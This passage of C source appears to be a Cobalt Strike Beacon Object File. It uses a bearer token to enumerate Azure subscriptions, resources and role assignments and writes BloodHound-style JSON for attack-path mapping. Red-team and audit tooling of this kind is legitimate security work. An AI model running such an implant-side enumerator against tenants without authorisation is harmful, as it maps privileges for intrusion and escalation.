                while (pc < de && (*pc == ' ' || *pc == '\t' || *pc == '\n' || *pc == '\r')) pc++;
                if (pc < de && *pc == '{') {
                    const char *pe = JsonSkipBalanced(pc, de);
                    if (pe)
                        roleName = JsonExtractStringValue(pc, pe, "\"roleName\"");
                }
            }
        }

        if (id && roleName && MSVCRT$strlen(id) > 0 && MSVCRT$strlen(roleName) > 0) {
            BarkBufAppend(&lb, id, MSVCRT$strlen(id));
            BarkBufAppend(&lb, "=", 1);
            BarkBufAppend(&lb, roleName, MSVCRT$strlen(roleName));
            BarkBufAppend(&lb, "\n", 1);
        }

        if (id) HFree(id);
        if (roleName) HFree(roleName);
        p = de;
    }

    HFree(content);

    if (lb.ok && lb.buf && lb.len > 0) {
        /* Null-terminate */
        BarkBufAppend(&lb, "\0", 1);
        char *result = lb.buf;
        lb.buf = NULL;
        BarkBufFree(&lb);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Loaded role-def lookup from %s\n", bestName);
        return result;
    }
    BarkBufFree(&lb);
    return NULL;
}

/* ================================================================
 * BarkGetBHAllResourceRoleAssignmentsGrouped
 *
 * Like BarkGetBHAllResourceRoleAssignments but:
 * - Groups assignments by roleDefinitionId
 * - Resolves roleName via the lookup string
 * - kind = "AZ<RoleNameNoSpaces>"
 * - Each assignment wrapped under the role name key
 *
 * If roleDefLookup is NULL or empty, attempts to load from disk.
 *
 * Output per role:
 *   {"kind":"AZKeyVaultSecretsUser","data":[
 *     {"KeyVaultSecretsUser":{...assignment...},"id":"/subscriptions/.../resource"},
 *     ...
 *   ]}
 * ================================================================ */
#define BARK_MAX_ROLE_ASSIGNMENTS 4096

typedef struct {
    const char *roleDefId;
    char roleName[128];
    int  count;
} BarkRoleGroup;

typedef struct {
    char *json;
    char *scope;
    char *roleDefId;
} BarkRoleAssignmentItem;

static void BarkGetBHAllResourceRoleAssignmentsGroupedWithSnapshots(
    const char *bearerToken, const char *resourceType,
    const char *roleDefLookupArg, const char *tenantId,
    const char *singleResourceId, const char *subscriptionSnapshot,
    const char *resourceSnapshot)
{
    /* Auto-load lookup from disk if not provided */
    char *autoLookup = NULL;
    const char *roleDefLookup = roleDefLookupArg;
    if (!roleDefLookup || MSVCRT$strlen(roleDefLookup) == 0) {
        autoLookup = BarkLoadRoleDefLookupFromDisk();
        roleDefLookup = autoLookup;
    }

    BarkIdList resIds;
    BarkIdListInit(&resIds);

    /* --- Phase 1: determine resource scopes --- */
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) { if (autoLookup) HFree(autoLookup); return; }

    if (singleResourceId && MSVCRT$strlen(singleResourceId) > 0) {
        /* Single resource provided — copy it as the only scope */
        SIZE_T sLen = MSVCRT$strlen(singleResourceId) + 1;
        char *copy = (char *)HAlloc(sLen);
        if (!copy) { HFree(hdrWide); BarkIdListFree(&resIds); if (autoLookup) HFree(autoLookup); return; }
        MSVCRT$memcpy(copy, singleResourceId, sLen);
        BarkIdListAppend(&resIds, copy);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Enumerating role assignments for: %s\n", singleResourceId);
    } else if (resourceType && MSVCRT$strlen(resourceType) > 0) {
        /* Enumerate resources via the cross-subscription endpoint.  "*" is
         * used by the generic resource collector to include every type. */
        char filterPath[512];
        if (MSVCRT$strcmp(resourceType, "*") == 0) {
            MSVCRT$sprintf_s(filterPath, sizeof(filterPath),
                "/resources?api-version=2021-04-01");
        } else {
            MSVCRT$sprintf_s(filterPath, sizeof(filterPath),
                "/resources?$filter=resourceType%%20eq%%20'%s'&api-version=2021-04-01",
                resourceType);
        }
        if (MSVCRT$strcmp(resourceType, "*") == 0 &&
            resourceSnapshot && resourceSnapshot[0]) {
            resIds = BarkParseResourceSnapshot(resourceSnapshot);
            if (resIds.count > 0) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[*] Reusing validated resource snapshot (%d resource(s))\n",
                    resIds.count);
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[!] Invalid resource snapshot; falling back to paginated live discovery\n");
            }
        }

        if (resIds.count == 0) {
            LPWSTR wFilterPath = MbsToWcs(filterPath);
            LPWSTR nextWide = NULL;
            char *nextUrl = NULL;
            LPCWSTR pathArg;
            if (!wFilterPath) { HFree(hdrWide); BarkIdListFree(&resIds); if (autoLookup) HFree(autoLookup); return; }
            pathArg = wFilterPath;

            /* /resources is paginated.  The previous single-page request
             * could omit later resources and their inherited assignments. */
            while (1) {
                DWORD status = 0;
                char *resp = HttpRequestWithRetry(L"GET",
                    L"management.azure.com", pathArg, hdrWide, NULL, 0,
                    &status);
                if (nextUrl) { HFree(nextUrl); nextUrl = NULL; }
                if (nextWide) { HFree(nextWide); nextWide = NULL; }
                if (!resp || status >= 400) {
                    if (resp) HFree(resp);
                    break;
                }

                {
                    SIZE_T respLen = MSVCRT$strlen(resp);
                    const char *end = resp + respLen;
                    const char *vKey = JsonFindKey(resp, end, "\"value\"");
                    if (vKey) {
                        const char *colon = JsonFindKey(vKey, end, ":");
                        if (colon) {
                            colon++;
                            while (colon < end && (*colon == ' ' ||
                                   *colon == '\t' || *colon == '\n' ||
                                   *colon == '\r')) colon++;
                            if (colon < end && *colon == '[') {
                                const char *arrEnd = JsonSkipBalanced(colon,
                                    end);
                                if (arrEnd) {
                                    const char *p = colon + 1;
                                    while (p < arrEnd - 1) {
                                        const char *itemEnd;
                                        char *rid;
                                        while (p < arrEnd - 1 && *p != '{')
                                            p++;
                                        if (p >= arrEnd - 1) break;
                                        itemEnd = JsonSkipBalanced(p, arrEnd);
                                        if (!itemEnd) break;
                                        rid = JsonExtractStringValue(p,
                                            itemEnd, "\"id\"");
                                        if (rid && MSVCRT$strlen(rid) > 0) {
                                            if (BarkIdListAppendUnique(
                                                    &resIds, rid) != 0)
                                                HFree(rid);
                                        } else if (rid) {
                                            HFree(rid);
                                        }
                                        p = itemEnd;
                                    }
                                }
                            }
                        }
                    }
                    nextUrl = JsonExtractNextLink(resp, end);
                }
                HFree(resp);
                if (!nextUrl) break;
                nextWide = BarkResolveNextLink(nextUrl,
                    L"management.azure.com", "");
                if (!nextWide) break;
                pathArg = nextWide;
            }
            if (nextUrl) HFree(nextUrl);
            if (nextWide) HFree(nextWide);
            HFree(wFilterPath);
        }

        /* The tenant-wide /resources route is not populated consistently by
         * ARM (some tenants return an empty page even though the same
         * subscription-scoped route returns resources). Retry per
         * subscription before giving up; this is also what lets VM-level
         * role collection see inherited subscription/resource-group grants. */
        if (resIds.count == 0 && MSVCRT$strcmp(resourceType, "*") == 0) {
            BarkIdList fallbackSubs = BarkParseSubscriptionSnapshot(subscriptionSnapshot);
            int fsi;
            if (fallbackSubs.count == 0)
                fallbackSubs = BarkEnumEntityIds(
                    L"management.azure.com",
                    "/subscriptions?api-version=2020-01-01",
                    bearerToken, "\"subscriptionId\"");
            for (fsi = 0; fsi < fallbackSubs.count; fsi++) {
                char fallbackPath[512];
                BarkIdList pageIds;
                MSVCRT$sprintf_s(fallbackPath, sizeof(fallbackPath),
                    "/subscriptions/%s/resources?api-version=2021-04-01",
                    fallbackSubs.ids[fsi]);
                pageIds = BarkEnumEntityIds(L"management.azure.com",
                    fallbackPath, bearerToken, "\"id\"");
                {
                    int pi;
                    for (pi = 0; pi < pageIds.count; pi++) {
                        char *copy = (char *)HAlloc(
                            MSVCRT$strlen(pageIds.ids[pi]) + 1);
                        if (!copy) continue;
                        MSVCRT$memcpy(copy, pageIds.ids[pi],
                            MSVCRT$strlen(pageIds.ids[pi]) + 1);
                        if (BarkIdListAppendUnique(&resIds, copy) != 0)
                            HFree(copy);
                    }
                }
                BarkIdListFree(&pageIds);
            }
            BarkIdListFree(&fallbackSubs);
        }
        if (resIds.count == 0) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] No resources of type %s found\n", resourceType);
            HFree(hdrWide); BarkIdListFree(&resIds); if (autoLookup) HFree(autoLookup); return;
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Found %d %s resource(s), enumerating effective role assignments...\n",
            resIds.count,
            MSVCRT$strcmp(resourceType, "*") == 0 ? "ARM" : resourceType);
    } else {
        /* No resourceType or singleResourceId — enumerate all subscriptions.
         * Use the same paginated helper as the general ARM collectors. */
        BarkIdList subIds = BarkParseSubscriptionSnapshot(subscriptionSnapshot);
        int si;
        if (subIds.count == 0) {
            if (subscriptionSnapshot && subscriptionSnapshot[0]) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[!] Invalid subscription snapshot; falling back to live discovery\n");
            }
            subIds = BarkEnumEntityIds(
                L"management.azure.com",
                "/subscriptions?api-version=2020-01-01",
                bearerToken, "\"subscriptionId\"");
        }
        if (subIds.count == 0)
            subIds = BarkMgmtGroupFallbackGetSubscriptionIds(bearerToken);
        for (si = 0; si < subIds.count; si++) {
            char scopeBuf[128];
            char *copy;
            SIZE_T sLen;
            MSVCRT$sprintf_s(scopeBuf, sizeof(scopeBuf),
                "/subscriptions/%s", subIds.ids[si]);
            sLen = MSVCRT$strlen(scopeBuf) + 1;
            copy = (char *)HAlloc(sLen);
            if (!copy) continue;
            MSVCRT$memcpy(copy, scopeBuf, sLen);
            if (BarkIdListAppendUnique(&resIds, copy) != 0)
                HFree(copy);
        }
        BarkIdListFree(&subIds);

        if (resIds.count == 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] No subscriptions found for role assignment enumeration\n");
            HFree(hdrWide); BarkIdListFree(&resIds); if (autoLookup) HFree(autoLookup); return;
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Found %d subscription(s), enumerating role assignments...\n", resIds.count);
    }

    /* --- Phase 2: collect all assignments across all scopes --- */
    BarkRoleAssignmentItem *items = (BarkRoleAssignmentItem *)HAlloc(
        BARK_MAX_ROLE_ASSIGNMENTS * sizeof(BarkRoleAssignmentItem));
    int itemCount = 0;
    int ri;

    if (!items) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Unable to allocate role-assignment index\n");
        goto cleanup_res;
    }

    for (ri = 0; ri < resIds.count && itemCount < BARK_MAX_ROLE_ASSIGNMENTS; ri++) {
        char raPath[2048];
        if ((!resourceType || resourceType[0] == '\0') &&
            (!singleResourceId || singleResourceId[0] == '\0')) {
            /* A subscription query without atScope() also returns descendant
             * grants. Wrapping those as effective at the subscription creates
             * false edges, so the subscription pass keeps authored-at-scope
             * assignments only. */
            MSVCRT$sprintf_s(raPath, sizeof(raPath),
                "%s/providers/Microsoft.Authorization/roleAssignments"
                "?api-version=2022-04-01&$filter=atScope()",
                resIds.ids[ri]);
        } else {
            /* Resource queries intentionally retain inherited subscription
             * and resource-group grants so RoleGraph gets effective edges. */
            MSVCRT$sprintf_s(raPath, sizeof(raPath),
                "%s/providers/Microsoft.Authorization/roleAssignments"
                "?api-version=2022-04-01",
                resIds.ids[ri]);
        }
        LPWSTR widePath = MbsToWcs(raPath);
        if (!widePath) continue;

        LPCWSTR pathArg = widePath;
        LPWSTR nextWide = NULL;
        char  *nextUrl  = NULL;

        while (1) {
            DWORD st = 0;
            char *rr = HttpRequestWithRetry(L"GET", L"management.azure.com",
                pathArg, hdrWide, NULL, 0, &st);
            if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
            if (nextWide) { HFree(nextWide); nextWide = NULL; }
            if (!rr || st >= 400) { if (rr) HFree(rr); break; }

            SIZE_T rrLen = MSVCRT$strlen(rr);
            const char *rrEnd = rr + rrLen;
            const char *vk = JsonFindKey(rr, rrEnd, "\"value\"");
            if (vk) {
                const char *cl = JsonFindKey(vk, rrEnd, ":");
                if (cl) {
                    cl++;
                    while (cl < rrEnd && (*cl == ' ' || *cl == '\t' ||
                           *cl == '\n' || *cl == '\r')) cl++;
                    if (cl < rrEnd && *cl == '[') {
                        const char *ae = JsonSkipBalanced(cl, rrEnd);
                        if (ae) {
                            const char *pp = cl + 1;
                            while (pp < ae - 1 && itemCount < BARK_MAX_ROLE_ASSIGNMENTS) {
                                while (pp < ae - 1 &&
                                       (*pp == ' ' || *pp == '\n' || *pp == '\r' ||
                                        *pp == '\t' || *pp == ','))
                                    pp++;
                                if (pp >= ae - 1 || *pp != '{') break;
                                const char *ie = JsonSkipBalanced(pp, ae);
                                if (!ie) break;
                                int jsonLen = (int)(ie - pp);
                                if (jsonLen > 0) {
                                    BarkRoleAssignmentItem *item = &items[itemCount];
                                    SIZE_T scopeLen = MSVCRT$strlen(resIds.ids[ri]);
                                    item->json = (char *)HAlloc((SIZE_T)jsonLen + 1);
                                    item->scope = (char *)HAlloc(scopeLen + 1);
                                    if (!item->json || !item->scope) {
                                        HFree(item->json);
                                        HFree(item->scope);
                                        item->json = NULL;
                                        item->scope = NULL;
                                        pp = ie;
                                        continue;
                                    }
                                    MSVCRT$memcpy(item->json, pp, (size_t)jsonLen);
                                    item->json[jsonLen] = '\0';

                                    /* The assignment object's properties.scope is
                                     * where the grant was authored.  The outer id
                                     * is the resource where the grant is effective,
                                     * including assignments inherited from an
                                     * ancestor scope. */
                                    MSVCRT$memcpy(item->scope,
                                        resIds.ids[ri], scopeLen + 1);

                                    /* Extract roleDefinitionId from properties. */
                                    const char *propsKey = JsonFindKey(pp, ie, "\"properties\"");
                                    if (propsKey) {
                                        const char *pc = JsonFindKey(propsKey, ie, ":");
                                        if (pc) {
                                            pc++;
                                            while (pc < ie && (*pc == ' ' || *pc == '\t' ||
                                                   *pc == '\n' || *pc == '\r')) pc++;
                                            if (pc < ie && *pc == '{') {
                                                const char *pe = JsonSkipBalanced(pc, ie);
                                                if (pe) {
                                                    item->roleDefId = JsonExtractStringValue(
                                                        pc, pe, "\"roleDefinitionId\"");
                                                }
                                            }
                                        }
                                    }
                                    itemCount++;
                                }
                                pp = ie;
                            }
                        }
                    }
                }
            }
            nextUrl = JsonExtractNextLink(rr, rrEnd);
            HFree(rr);
            if (!nextUrl) break;
            char *np = nextUrl;
            if (MSVCRT$strncmp(np, "http://", 7) == 0)       np += 7;
            else if (MSVCRT$strncmp(np, "https://", 8) == 0)  np += 8;
            char *sl = MSVCRT$strstr(np, "/");
            nextWide = MbsToWcs(sl ? sl : nextUrl);
            if (!nextWide) { HFree(nextUrl); nextUrl = NULL; break; }
            pathArg = nextWide;
        }
        HFree(widePath);
    }
    if (itemCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No role assignments found\n");
        goto cleanup_items;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Collected %d role assignment(s), grouping by roleDefinitionId...\n", itemCount);

    /* --- Phase 3: group by roleDefinitionId --- */
    BarkRoleGroup *groups = (BarkRoleGroup *)HAlloc(
        BARK_MAX_ENUM_IDS * sizeof(BarkRoleGroup));
    int groupCount = 0;
    int ii;

    if (!groups) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Unable to allocate role-assignment groups\n");
        goto cleanup_items;
    }

    for (ii = 0; ii < itemCount; ii++) {
        int found = 0, gi;
        for (gi = 0; gi < groupCount; gi++) {
            if (MSVCRT$strcmp(SAFE_STR(groups[gi].roleDefId),
                              SAFE_STR(items[ii].roleDefId)) == 0) {
                groups[gi].count++;
                found = 1;
                break;
            }
        }
        if (!found && groupCount < BARK_MAX_ENUM_IDS) {
            groups[groupCount].roleDefId = items[ii].roleDefId;
            if (!BarkLookupRoleName(roleDefLookup,
                    SAFE_STR(items[ii].roleDefId),
                    groups[groupCount].roleName,
                    sizeof(groups[groupCount].roleName)) &&
                !BarkFetchRoleNameArm(hdrWide,
                    SAFE_STR(items[ii].roleDefId),
                    groups[groupCount].roleName,
                    sizeof(groups[groupCount].roleName))) {
                BeaconPrintf(CALLBACK_ERROR,
                    "[!] Could not resolve role definition %s; using Unknown\n",
                    SAFE_STR(items[ii].roleDefId));
            }
            groups[groupCount].count = 1;
            groupCount++;
        }
    }

    /* --- Phase 4: emit one file per role group --- */
    {
        int filesWritten = 0;
        int gi;
        for (gi = 0; gi < groupCount; gi++) {
            char kindBuf[256];
            char stripped[128];
            BarkStripSpaces(groups[gi].roleName, stripped, sizeof(stripped));
            MSVCRT$sprintf_s(kindBuf, sizeof(kindBuf), "AZ%s", stripped);

            BarkBuf b = { NULL, 0, 0, 1 };
            BarkBufAppend(&b, "{\"data\":[", 9);

            int ai;
            int emittedInGroup = 0;
            for (ai = 0; ai < itemCount; ai++) {
                char entryPrefix[256];
                int ep;
                if (MSVCRT$strcmp(SAFE_STR(groups[gi].roleDefId),
                                  SAFE_STR(items[ai].roleDefId)) != 0)
                    continue;
                if (emittedInGroup == 0)
                    ep = MSVCRT$sprintf_s(entryPrefix, sizeof(entryPrefix),
                        "{\"%s\":", stripped);
                else
                    ep = MSVCRT$sprintf_s(entryPrefix, sizeof(entryPrefix),
                        ",{\"%s\":", stripped);
                if (ep > 0) BarkBufAppend(&b, entryPrefix, (SIZE_T)ep);
                BarkBufAppend(&b, items[ai].json, MSVCRT$strlen(items[ai].json));
                char idSuffix[1024];
                int isn = MSVCRT$sprintf_s(idSuffix, sizeof(idSuffix),
                    ",\"id\":\"%s\"}", items[ai].scope);
                if (isn > 0) BarkBufAppend(&b, idSuffix, (SIZE_T)isn);
                emittedInGroup++;
            }

            char tail[256];
            int tailLen = MSVCRT$sprintf_s(tail, sizeof(tail),
                "],\"kind\":\"%s\"}", kindBuf);
            if (tailLen > 0) BarkBufAppend(&b, tail, (SIZE_T)tailLen);

            if (b.ok && b.buf) {
                SYSTEMTIME st;
                KERNEL32$GetLocalTime(&st);
                char filename[300];
                const char *scopeFamily =
                    (singleResourceId && singleResourceId[0]) ? "Single" :
                    ((resourceType && resourceType[0]) ? "Resource" :
                     "Subscription");
                MSVCRT$sprintf_s(filename, sizeof(filename),
                    ".\\AZ%sRoleAssignments_%s_%04u%02u%02u_%02u%02u%02u_%03d.json",
                    stripped, scopeFamily,
                    (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay,
                    (unsigned)st.wHour, (unsigned)st.wMinute, (unsigned)st.wSecond,
                    gi);
                BeaconPrintf(CALLBACK_OUTPUT,
                        "[+] BARK %s: %d assignment(s)\n",
                        kindBuf, groups[gi].count);
                BarkWriteOutput(filename, b.buf, (DWORD)b.len);
                filesWritten++;
            }
            BarkBufFree(&b);
        }
        if (filesWritten > 0)
            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] BARK role assignments: %d role type(s), %d total assignment(s) across %d scope(s)\n",
                filesWritten, itemCount, resIds.count);
    }
    HFree(groups);

cleanup_items:
    {
        int cleanupIndex;
        for (cleanupIndex = 0; cleanupIndex < itemCount; cleanupIndex++) {
            HFree(items[cleanupIndex].json);
            HFree(items[cleanupIndex].scope);
            HFree(items[cleanupIndex].roleDefId);
        }
        HFree(items);
    }
cleanup_res:
    HFree(hdrWide);
    BarkIdListFree(&resIds);
    if (autoLookup) HFree(autoLookup);
}

static void BarkGetBHAllResourceRoleAssignmentsGroupedWithSnapshot(
    const char *bearerToken, const char *resourceType,
    const char *roleDefLookupArg, const char *tenantId,
    const char *singleResourceId, const char *subscriptionSnapshot)
{
    BarkGetBHAllResourceRoleAssignmentsGroupedWithSnapshots(
        bearerToken, resourceType, roleDefLookupArg, tenantId,
        singleResourceId, subscriptionSnapshot, NULL);
}

static void BarkGetBHAllResourceRoleAssignmentsGrouped(
    const char *bearerToken, const char *resourceType,
    const char *roleDefLookupArg, const char *tenantId,
    const char *singleResourceId) {
    BarkGetBHAllResourceRoleAssignmentsGroupedWithSnapshot(
        bearerToken, resourceType, roleDefLookupArg, tenantId,
        singleResourceId, NULL);
}

/* ================================================================
 * BarkParseArmId
 *
 * Given a JSON item body, extract the "id" field and parse out the
 * ARM subscriptionId and resourceGroupId from the path.
 * ARM id format: /subscriptions/{subId}/resourceGroups/{rgName}/...
 * resourceGroupId format: /subscriptions/{subId}/resourceGroups/{rgName}
 *
 * subId and rgId buffers are filled in; cleared to "" on failure.
 * ================================================================ */
static void BarkParseArmId(const char *item, const char *itemEnd,
                           char *subId, int subIdSize,
                           char *rgId, int rgIdSize) {
    subId[0] = '\0';
    rgId[0]  = '\0';

    char *armId = JsonExtractStringValue(item, itemEnd, "\"id\"");
    if (!armId) return;

    /* Extract subscriptionId as full path: /subscriptions/{guid} */
    const char *subPrefix = MSVCRT$strstr(armId, "/subscriptions/");
    if (!subPrefix) subPrefix = MSVCRT$strstr(armId, "/Subscriptions/");
    const char *subStart = NULL;
    if (subPrefix) {
        subStart = subPrefix + 15; /* strlen("/subscriptions/") */
        const char *subEnd = MSVCRT$strstr(subStart, "/");
        int guidLen = subEnd ? (int)(subEnd - subStart) : (int)MSVCRT$strlen(subStart);
        /* Write "/subscriptions/{guid}" */
        int n = MSVCRT$sprintf_s(subId, subIdSize, "/subscriptions/");
        if (n > 0 && n + guidLen < subIdSize) {
            MSVCRT$memcpy(subId + n, subStart, (size_t)guidLen);
            subId[n + guidLen] = '\0';
        }
    }

    /* Extract resourceGroupId: /subscriptions/{guid}/resourceGroups/{rg} */
    const char *rgStart = MSVCRT$strstr(armId, "/resourceGroups/");
    if (!rgStart) rgStart = MSVCRT$strstr(armId, "/resourcegroups/");
    if (rgStart && subStart) {
        const char *rgNameStart = rgStart + 16; /* strlen("/resourceGroups/") */
        const char *rgNameEnd = MSVCRT$strstr(rgNameStart, "/");
        int rgNameLen = rgNameEnd ? (int)(rgNameEnd - rgNameStart) : (int)MSVCRT$strlen(rgNameStart);
        /* subId is already "/subscriptions/{guid}", append "/resourceGroups/{rg}" */
        int n = MSVCRT$sprintf_s(rgId, rgIdSize, "%s/resourceGroups/", subId);
        if (n > 0 && n + rgNameLen < rgIdSize) {
            MSVCRT$memcpy(rgId + n, rgNameStart, (size_t)rgNameLen);
            rgId[n + rgNameLen] = '\0';
        }
    }

    HFree(armId);
}

/* ARM-context variant of BarkBufPrintBHItem.
 * Injects tenantId, subscriptionId, resourceGroupId (extracted per-item)
 * before the closing } of each data object. */
static void BarkBufPrintBHItemArm(BarkBuf *b, const char *kind,
                                   const char *item, const char *itemEnd,
                                   int isFirst, const char *tenantId,
                                   const char *rgField) {
    BarkBuf assembled = { NULL, 0, 0, 1 };
    if (g_emit_resource_snapshot && kind &&
        MSVCRT$strcmp(kind, "AZResource") == 0 &&
        !g_resource_snapshot_overflow) {
        char *resourceId = JsonExtractStringValue(item, itemEnd, "\"id\"");
        if (resourceId && resourceId[0]) {
            DWORD resourceIdLen = (DWORD)MSVCRT$strlen(resourceId);
            if (g_resource_snapshot_bytes + resourceIdLen + 1 <= 60000) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[BARK/v5] resource snapshot: %s\n", resourceId);
                g_resource_snapshot_bytes += resourceIdLen + 1;
            } else {
                g_resource_snapshot_overflow = 1;
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[BARK/v5] resource snapshot overflow\n");
            }
        }
        if (resourceId) HFree(resourceId);
    }

    char subId[128] = {0};
    char rgId[512]  = {0};
    BarkParseArmId(item, itemEnd, subId, sizeof(subId), rgId, sizeof(rgId));

    if ((itemEnd > item) && *(itemEnd - 1) == '}') {
        BarkBufAppend(&assembled, item, (SIZE_T)(itemEnd - item - 1));
        if (kind && MSVCRT$strcmp(kind, "AZVM") == 0) {
            /* AzureHound's VM model serializes these as empty objects when
             * ARM omits them. Preserve real ARM values and only add the
            * compatibility placeholders when absent. */
            if (!JsonFindKey(item, itemEnd, "\"extendedLocation\""))
                BarkBufAppend(&assembled, ",\"extendedLocation\":{}", 22);
            if (!JsonFindKey(item, itemEnd, "\"plan\""))
                BarkBufAppend(&assembled, ",\"plan\":{}", 10);
        }
        char suffix[1024];
        int sn = MSVCRT$sprintf_s(suffix, sizeof(suffix),
            ",\"subscriptionId\":\"%s\",\"%s\":\"%s\",\"tenantId\":\"%s\"}",
            subId, rgField ? rgField : "resourceGroupId", rgId, SAFE_STR(tenantId));
        if (sn > 0) BarkBufAppend(&assembled, suffix, (SIZE_T)sn);
    } else {
        BarkBufAppend(&assembled, item, (SIZE_T)(itemEnd - item));
    }
    if (assembled.ok && assembled.buf) {
        BarkBufPrintBHItem(b, kind, assembled.buf,
            assembled.buf + assembled.len, isFirst, NULL, 0);
    }
    BarkBufFree(&assembled);
}

static int BarkBufEmitBHArrayBodyArm(BarkBuf *b,
                                      const char *body, const char *bodyEnd,
                                      const char *kind, int alreadyEmitted,
                                      const char *tenantId, const char *rgField) {
    int count = 0;
    const char *p = body;
    while (p < bodyEnd) {
        while (p < bodyEnd &&
               (*p == ' ' || *p == '\n' || *p == '\r' ||
                *p == '\t' || *p == ','))
            p++;
        if (p >= bodyEnd || *p != '{') break;
        const char *itemEnd = JsonSkipBalanced(p, bodyEnd);
        if (!itemEnd) break;
        BarkBufPrintBHItemArm(b, kind, p, itemEnd,
                               (alreadyEmitted + count) == 0, tenantId, rgField);
        count++;
        p = itemEnd;
    }
    return count;
}

/* A stable completion marker consumed by the all-info CNA barrier.  Keep the
 * mapping here so every ARM collector that uses the shared pagination helpers
 * gets a marker after its output file has been written. */
static void BarkEmitAllInfoArmMarker(const char *kind) {
    const char *name = NULL;
    if (!kind) return;
    if (MSVCRT$strcmp(kind, "AZRoleDefinition") == 0) name = "arm_role_definitions";
    else if (MSVCRT$strcmp(kind, "AZSubscription") == 0) name = "arm_subscriptions";
    else if (MSVCRT$strcmp(kind, "AZResource") == 0) name = "arm_resources";
    else if (MSVCRT$strcmp(kind, "AZVM") == 0) name = "arm_vms";
    else if (MSVCRT$strcmp(kind, "AZVMScaleSet") == 0) name = "arm_vm_scale_sets";
    else if (MSVCRT$strcmp(kind, "AZKeyVault") == 0) name = "arm_key_vaults";
    else if (MSVCRT$strcmp(kind, "AZStorageAccount") == 0) name = "arm_storage_accounts";
    else if (MSVCRT$strcmp(kind, "AZLogicApp") == 0) name = "arm_logic_apps";
    else if (MSVCRT$strcmp(kind, "AZFunctionApp") == 0) name = "arm_function_apps";
    else if (MSVCRT$strcmp(kind, "AZWebApp") == 0) name = "arm_web_apps";
    else if (MSVCRT$strcmp(kind, "AZManagedCluster") == 0) name = "arm_aks";
    else if (MSVCRT$strcmp(kind, "AZContainerRegistry") == 0) name = "arm_acr";
    else if (MSVCRT$strcmp(kind, "AZAutomationAccount") == 0) name = "arm_automation_accounts";
    else if (MSVCRT$strcmp(kind, "AZContainerApp") == 0) name = "arm_container_apps";
    else if (MSVCRT$strcmp(kind, "AZContainerGroup") == 0) name = "arm_container_groups";
    else if (MSVCRT$strcmp(kind, "AZCosmosDB") == 0) name = "arm_cosmos_dbs";
    else if (MSVCRT$strcmp(kind, "AZManagementGroupRoleAssignment") == 0)
        name = "arm_management_group_role_assignments";
    else if (MSVCRT$strcmp(kind, "AZDenyAssignment") == 0)
        name = "arm_deny_assignments";
    else if (MSVCRT$strcmp(kind, "AZRoleEligibilityScheduleInstance") == 0)
        name = "arm_role_eligibility_schedule_instances";
    else if (MSVCRT$strcmp(kind, "AZRoleAssignmentScheduleInstance") == 0)
        name = "arm_role_assignment_schedule_instances";
    else if (MSVCRT$strcmp(kind, "AZRoleManagementPolicyAssignment") == 0)
        name = "arm_role_management_policy_assignments";
    else if (MSVCRT$strcmp(kind, "AZRoleManagementPolicy") == 0)
        name = "arm_role_management_policies";
    if (name) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[BARK/v5] all-info collector complete: %s\n", name);
    }
}

static void BarkBufAppendJsonQuoted(BarkBuf *output, const char *value) {
    const unsigned char *cursor = (const unsigned char *)(value ? value : "");
    BarkBufAppend(output, "\"", 1);
    while (*cursor) {
        if (*cursor == '"' || *cursor == '\\') {
            char escaped[2];
            escaped[0] = '\\';
            escaped[1] = (char)*cursor;
            BarkBufAppend(output, escaped, 2);
        } else if (*cursor >= 0x20) {
            char valueByte = (char)*cursor;
            BarkBufAppend(output, &valueByte, 1);
        }
        cursor++;
    }
    BarkBufAppend(output, "\"", 1);
}

static void BarkBufAppendScopeValue(BarkBuf *output, int *count,
                                    const char *scope) {
    if (*count > 0) BarkBufAppend(output, ",", 1);
    BarkBufAppendJsonQuoted(output, scope);
    (*count)++;
}

static void BarkBuildManagementGroupScope(const char *groupId,
                                           char *scope, SIZE_T scopeSize) {
    SIZE_T index;
    MSVCRT$sprintf_s(scope, scopeSize,
        "/providers/Microsoft.Management/managementGroups/%s",
        groupId ? groupId : "");
    for (index = 0; scope[index]; index++) {
        if (scope[index] >= 'a' && scope[index] <= 'z')
            scope[index] = (char)(scope[index] - ('a' - 'A'));
    }
}

static void BarkUppercaseAsciiInPlace(char *value) {
    SIZE_T index;
    if (!value) return;
    for (index = 0; value[index]; index++) {
        if (value[index] >= 'a' && value[index] <= 'z')
            value[index] = (char)(value[index] - ('a' - 'A'));
    }
}

static void BarkBufAppendCollectionTail(BarkBuf *output, int emitted,
                                        const char *scopeType,
                                        BarkBuf *requestedScopes,
                                        BarkBuf *successfulScopes,
                                        BarkBuf *failedScopes,
                                        int requestedCount,
                                        int successfulCount,
                                        int failedCount,
                                        int parentEnumerationComplete) {
    char prefix[256];
    int complete = parentEnumerationComplete && failedCount == 0 &&
                   requestedCount == successfulCount;
    int prefixLength = MSVCRT$sprintf_s(prefix, sizeof(prefix),
        "],\"meta\":{\"type\":\"azure\",\"version\":5,\"count\":%d%s%s%s,"
        "\"collection\":{\"complete\":%s,\"requestedScopes\":",
        emitted,
        scopeType ? ",\"scope\":\"" : "",
        scopeType ? scopeType : "",
        scopeType ? "\"" : "",
        complete ? "true" : "false");
    if (prefixLength > 0)
        BarkBufAppend(output, prefix, (SIZE_T)prefixLength);
    BarkBufAppend(requestedScopes, "]", 1);
    BarkBufAppend(successfulScopes, "]", 1);
    BarkBufAppend(failedScopes, "]", 1);
